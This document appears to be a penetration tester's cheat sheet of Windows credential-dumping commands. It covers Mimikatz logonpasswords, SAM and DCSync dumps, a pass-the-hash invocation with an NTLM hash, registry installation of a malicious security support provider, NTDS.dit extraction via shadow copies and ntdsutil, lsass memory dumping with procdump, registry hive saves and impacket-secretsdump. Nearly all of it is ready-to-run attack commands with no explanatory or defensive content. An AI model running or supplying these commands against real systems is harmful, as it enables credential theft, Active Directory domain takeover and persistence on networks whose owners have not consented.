### Mimikatz
```
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
mimikatz token::elevate lsadump::sam
mimikatz "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
mimikatz "lsadump::sam"
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
Invoke-Mimikatz -command '"lsadump::dcsync /user:activebreach.io\krbtgt"'
Invoke-Mimikatz -command '"lsadump::dcsync /domain:insomnia.io /all /csv"'
Invoke-Mimikatz -command '"lsadump::dcsync /domain:activebreach.io /user:john"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Join /domain:insomnia.io /ntlm:01C7B72061EE0AE755269C885A99B86F /run:powershell.exe"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:gcb\administrator /dc:gcb-dc.gcb.local /domain:gcb.local"'
```
### SSP
```
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
type C:\Windows\System32\kiwissp.log
```

### vssadmin

```

vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system  SYSTEM LOCAL
```

### ntdsutil
#Two new folders will be generated: Active Directory and Registry. 
```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

### Procdump
```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
minidump.exe lsass.dmp
```
### LSA 
```
reg save hklm\sam c:\Users\Public\sam.save
reg save hklm\security c:\Users\Public\security.save
reg save hklm\system c:\Users\Public\system.save

/usr/bin/impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL 
/usr/bin/impacket-secretsdump -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL

reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
samdump2 system.hiv sam.hiv > hash.txt

/usr/bin/impacket-secretsdump -just-dc -k -no-pass worklab/DC01\$@172.16.40.5

```


```
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 

NTDSDumpEx.exe -d C:\ntds.dit -s C:\SYSTEM
```
